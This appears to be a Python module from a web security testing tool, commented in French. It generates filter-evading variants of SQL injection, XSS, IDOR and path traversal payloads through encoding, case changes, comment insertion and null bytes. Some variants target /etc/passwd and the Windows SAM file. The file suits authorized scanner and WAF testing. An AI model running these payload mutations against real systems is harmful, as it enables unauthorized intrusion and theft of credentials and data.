"""Mutations deterministes de payloads sans dependance externe.

Ce module fournit des strategies de mutation par type d'attaque
pour generer des variantes de payloads sans appel API.
Chaque strategie produit des variantes uniques, filtrees contre l'original.
"""

from __future__ import annotations

import random
import re
import urllib.parse

from src.infra.logging import get_logger

logger = get_logger(__name__)


# ---------------------------------------------------------------------------
# SQLi mutations
# ---------------------------------------------------------------------------


def _sqli_case_variations(payload: str) -> list[str]:
    """Variations de casse sur les mots-cles SQL."""
    variants = []
    keywords = ["OR", "AND", "UNION", "SELECT", "FROM", "WHERE", "INSERT", "DROP", "NULL"]
    for kw in keywords:
        if kw.lower() in payload.lower():
            # Minuscule
            variants.append(re.sub(re.escape(kw), kw.lower(), payload, flags=re.IGNORECASE))
            # Premiere majuscule
            variants.append(re.sub(re.escape(kw), kw.capitalize(), payload, flags=re.IGNORECASE))
            # Alternance casse
            alt = "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(kw))
            variants.append(re.sub(re.escape(kw), alt, payload, flags=re.IGNORECASE))
    return variants


def _sqli_whitespace(payload: str) -> list[str]:
    """Variations d'espacement dans les payloads SQL."""
    variants = []
    if " " in payload:
        variants.append(payload.replace(" ", "\t"))
        variants.append(payload.replace(" ", "  "))
        variants.append(payload.replace(" ", "/**/"))
        variants.append(payload.replace(" ", "%09"))
    return variants


def _sqli_comment_styles(payload: str) -> list[str]:
    """Variations de styles de commentaires SQL."""
    variants = []
    if "--" in payload:
        variants.append(payload.replace("--", "#"))
        variants.append(payload.replace("--", "/*"))
        variants.append(payload.replace("--", "-- -"))
        variants.append(payload.replace("--", "--;"))
    if "#" in payload:
        variants.append(payload.replace("#", "--"))
        variants.append(payload.replace("#", "-- -"))
    return variants


def _sqli_string_quotes(payload: str) -> list[str]:
    """Variations de guillemets dans les payloads SQL."""
    variants = []
    if "'" in payload:
        variants.append(payload.replace("'", '"'))
        variants.append(payload.replace("'", "`"))
    return variants


def _sqli_logical_equivalents(payload: str) -> list[str]:
    """Equivalences logiques pour les conditions SQL."""
    variants = []
    equivalents = {
        "OR 1=1": ["OR 2=2", "OR 'a'='a'", "OR 1 LIKE 1", "OR 1<2", "OR 2>1"],
        "or 1=1": ["or 2=2", "or 'a'='a'", "or 1 like 1", "or 1<2", "or 2>1"],
    }
    for original, replacements in equivalents.items():
        if original in payload:
            for repl in replacements:
                variants.append(payload.replace(original, repl))
    return variants


def _sqli_encoding(payload: str) -> list[str]:
    """Encodage URL de caracteres speciaux SQL."""
    variants = []
    if "'" in payload:
        variants.append(payload.replace("'", "%27"))
    if " " in payload:
        variants.append(payload.replace(" ", "%20"))
    if "=" in payload:
        variants.append(payload.replace("=", "%3D"))
    # Double encoding
    if "'" in payload:
        variants.append(payload.replace("'", "%2527"))
    return variants


def _sqli_inline_comments(payload: str) -> list[str]:
    """Insertion de commentaires inline dans les mots-cles SQL."""
    variants = []
    keywords = ["UNION", "SELECT", "FROM", "WHERE", "INSERT", "DROP"]
    for kw in keywords:
        if kw in payload.upper():
            # Insert /**/ in the middle of the keyword
            mid = len(kw) // 2
            broken = kw[:mid] + "/**/" + kw[mid:]
            variants.append(re.sub(re.escape(kw), broken, payload, flags=re.IGNORECASE))
    return variants


def _sqli_concatenation(payload: str) -> list[str]:
    """Concatenation de chaines dans les payloads SQL."""
    variants = []
    # Find quoted strings and break them
    match = re.search(r"'([^']+)'", payload)
    if match:
        s = match.group(1)
        if len(s) >= 2:
            mid = len(s) // 2
            concat = f"'{s[:mid]}'||'{s[mid:]}'"
            variants.append(payload.replace(f"'{s}'", concat))
            concat_plus = f"'{s[:mid]}'+''{s[mid:]}'"
            variants.append(payload.replace(f"'{s}'", concat_plus))
    return variants


def _mutate_sqli(payload: str) -> list[str]:
    """Applique toutes les strategies de mutation SQLi."""
    all_variants: list[str] = []
    all_variants.extend(_sqli_case_variations(payload))
    all_variants.extend(_sqli_whitespace(payload))
    all_variants.extend(_sqli_comment_styles(payload))
    all_variants.extend(_sqli_string_quotes(payload))
    all_variants.extend(_sqli_logical_equivalents(payload))
    all_variants.extend(_sqli_encoding(payload))
    all_variants.extend(_sqli_inline_comments(payload))
    all_variants.extend(_sqli_concatenation(payload))
    return all_variants


# ---------------------------------------------------------------------------
# XSS mutations
# ---------------------------------------------------------------------------


def _xss_tag_variations(payload: str) -> list[str]:
    """Variations de casse sur les balises HTML."""
    variants = []
    tags = ["script", "img", "svg", "iframe", "body", "details"]
    for tag in tags:
        pattern = re.compile(re.escape(f"<{tag}"), re.IGNORECASE)
        if pattern.search(payload):
            variants.append(pattern.sub(f"<{tag.upper()}", payload))
            variants.append(pattern.sub(f"<{tag.capitalize()}", payload))
            # Mixed case
            mixed = "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(tag))
            variants.append(pattern.sub(f"<{mixed}", payload))
    return variants


def _xss_event_handlers(payload: str) -> list[str]:
    """Substitution de gestionnaires d'evenements."""
    variants = []
    handlers = ["onerror", "onload", "onfocus", "onmouseover", "onclick", "onmouseenter"]
    for h in handlers:
        if h in payload.lower():
            for replacement in handlers:
                if replacement != h:
                    variants.append(re.sub(re.escape(h), replacement, payload, flags=re.IGNORECASE))
            break
    return variants


def _xss_encoding(payload: str) -> list[str]:
    """Encodage HTML et Unicode de payloads XSS."""
    variants = []
    # HTML entities
    if "<" in payload:
        variants.append(payload.replace("<", "&#x3C;").replace(">", "&#x3E;"))
        variants.append(payload.replace("<", "&#60;").replace(">", "&#62;"))
        variants.append(payload.replace("<", "%3C").replace(">", "%3E"))
    # Unicode escapes for alert
    if "alert" in payload:
        variants.append(payload.replace("alert", "\\u0061lert"))
        variants.append(payload.replace("alert", "al\\u0065rt"))
    return variants


def _xss_protocol_tricks(payload: str) -> list[str]:
    """Variantes utilisant des protocoles alternatifs."""
    variants = []
    if "alert" in payload or "script" in payload.lower():
        # Extract the alert/function call
        alert_match = re.search(r"(alert\([^)]*\))", payload)
        func_call = alert_match.group(1) if alert_match else "alert(1)"
        variants.append(f"javascript:{func_call}")
        variants.append(f"data:text/html,<script>{func_call}</script>")
        variants.append(f"javascript:void({func_call})")
    return variants


def _xss_alternative_tags(payload: str) -> list[str]:
    """Variantes utilisant des balises HTML alternatives."""
    variants = []
    alert_match = re.search(r"(alert\([^)]*\))", payload)
    func_call = alert_match.group(1) if alert_match else "alert(1)"

    if "<script" in payload.lower():
        variants.append(f"<img src=x onerror={func_call}>")
        variants.append(f"<svg onload={func_call}>")
        variants.append(f"<details open ontoggle={func_call}>")
        variants.append(f"<body onload={func_call}>")
        variants.append(f"<input onfocus={func_call} autofocus>")
        variants.append(f"<marquee onstart={func_call}>")
    return variants


def _mutate_xss(payload: str) -> list[str]:
    """Applique toutes les strategies de mutation XSS."""
    all_variants: list[str] = []
    all_variants.extend(_xss_tag_variations(payload))
    all_variants.extend(_xss_event_handlers(payload))
    all_variants.extend(_xss_encoding(payload))
    all_variants.extend(_xss_protocol_tricks(payload))
    all_variants.extend(_xss_alternative_tags(payload))
    return all_variants


# ---------------------------------------------------------------------------
# IDOR mutations
# ---------------------------------------------------------------------------


def _mutate_idor(payload: str) -> list[str]:
    """Mutations pour les payloads IDOR (enumeration d'identifiants)."""
    variants = []

    # Try to find a numeric ID in the payload
    match = re.search(r"(\d+)", payload)
    if match:
        original_id = int(match.group(1))
        # Enumeration autour de l'ID
        test_ids = [0, 1, 2, 3, 99, 100, -1, original_id + 1, original_id - 1]
        for tid in test_ids:
            variant = payload[: match.start()] + str(tid) + payload[match.end() :]
            variants.append(variant)

        # Format variations
        id_str = match.group(1)
        variants.append(payload[: match.start()] + f"0{id_str}" + payload[match.end() :])
        variants.append(payload[: match.start()] + f"00{id_str}" + payload[match.end() :])
        variants.append(payload[: match.start()] + f"{id_str}.0" + payload[match.end() :])
    else:
        # If no numeric ID, try UUID-like or string-based enumeration
        variants.append(payload + "/../1")
        variants.append(payload + "?id=1")
        variants.append(payload + "?id=2")
    return variants


# ---------------------------------------------------------------------------
# Path Traversal mutations
# ---------------------------------------------------------------------------


def _mutate_path_traversal(payload: str) -> list[str]:
    """Mutations pour les payloads de traversee de chemin."""
    variants = []

    if "../" in payload or "..\\" in payload:
        # Depth variations — add more levels
        variants.append("../" + payload)
        variants.append("../../" + payload)
        if payload.startswith("../"):
            # URL encoding
            variants.append(payload.replace("../", "..%2f"))
            variants.append(payload.replace("../", "%2e%2e/"))
            variants.append(payload.replace("../", "%2e%2e%2f"))
            # Double encoding
            variants.append(payload.replace("../", "..%252f"))
            variants.append(payload.replace("../", "%252e%252e/"))
            # OS variants (Windows)
            variants.append(payload.replace("../", "..\\"))
            variants.append(payload.replace("../", "..\\..\\"))

        # Null byte injection
        if "%00" not in payload:
            variants.append(payload + "%00")
            variants.append(payload + "%00.html")
            variants.append(payload + "%00.jpg")
    else:
        # Payload doesn't have traversal yet — add standard ones
        variants.append("../../" + payload)
        variants.append("../../../" + payload)
        variants.append("../../../../etc/passwd")
        variants.append("..%2f..%2f" + payload)
        variants.append("..\\..\\windows\\system32\\config\\sam")
    return variants


# ---------------------------------------------------------------------------
# Generic / fallback mutations
# ---------------------------------------------------------------------------


def _mutate_generic(payload: str) -> list[str]:
    """Mutations generiques applicables a tout type de payload."""
    variants = []
    # URL encoding
    variants.append(urllib.parse.quote(payload))
    # Double URL encoding
    variants.append(urllib.parse.quote(urllib.parse.quote(payload)))
    # Prepend/append whitespace
    variants.append(f" {payload}")
    variants.append(f"{payload} ")
    # Null byte
    variants.append(f"{payload}%00")
    # Case inversion
    variants.append(payload.swapcase())
    return variants


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

# Dispatch par type d'attaque
_MUTATORS: dict[str, callable] = {
    "sqli": _mutate_sqli,
    "xss": _mutate_xss,
    "idor": _mutate_idor,
    "path_traversal": _mutate_path_traversal,
}


def mutate_payload(payload: str, attack_type: str, n_variants: int = 5) -> list[str]:
    """Genere des variantes deterministes d'un payload selon le type d'attaque.

    Args:
        payload: Payload original a muter.
        attack_type: Type d'attaque (sqli, xss, idor, path_traversal, etc.).
        n_variants: Nombre maximum de variantes a retourner.

    Returns:
        Liste de variantes uniques, differentes de l'original.
    """
    mutator = _MUTATORS.get(attack_type, _mutate_generic)
    all_variants = mutator(payload)

    # Ajouter des mutations generiques si pas assez de variantes specifiques
    if len(all_variants) < n_variants:
        all_variants.extend(_mutate_generic(payload))

    # Filtrer : uniques, differents de l'original, non vides
    seen: set[str] = set()
    unique: list[str] = []
    for v in all_variants:
        v = v.strip()
        if v and v != payload and v not in seen:
            seen.add(v)
            unique.append(v)

    # Melanger et limiter
    random.shuffle(unique)
    result = unique[:n_variants]

    logger.info(
        "Offline mutation: %d variantes generees pour '%s' (type=%s)",
        len(result),
        payload[:50],
        attack_type,
    )
    return result
